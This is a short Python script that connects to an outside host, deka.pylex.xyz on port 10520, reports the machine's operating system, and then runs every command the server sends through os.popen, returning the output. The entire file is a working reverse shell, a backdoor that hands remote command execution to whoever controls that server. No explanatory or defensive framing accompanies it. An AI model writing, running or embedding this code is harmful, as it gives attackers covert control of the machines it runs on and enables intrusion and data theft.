import socket
import os
import platform

def receive_commands(server_ip="deka.pylex.xyz", port=10520):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))
    print(f"Connected to the server at {server_ip}:{port}.")

    # Send the OS type to the server
    client_os = platform.system()
    client.send(client_os.encode())

    while True:
        try:
            command = client.recv(1024).decode()
            if not command:
                break

            print(f"Command received: {command}")

            output = os.popen(command).read()

            if not output:
                output = "[No output]"

            client.send(output.encode())

        except Exception as e:
            print(f"Error: {e}")
            break

    client.close()

if __name__ == "__main__":
    receive_commands()
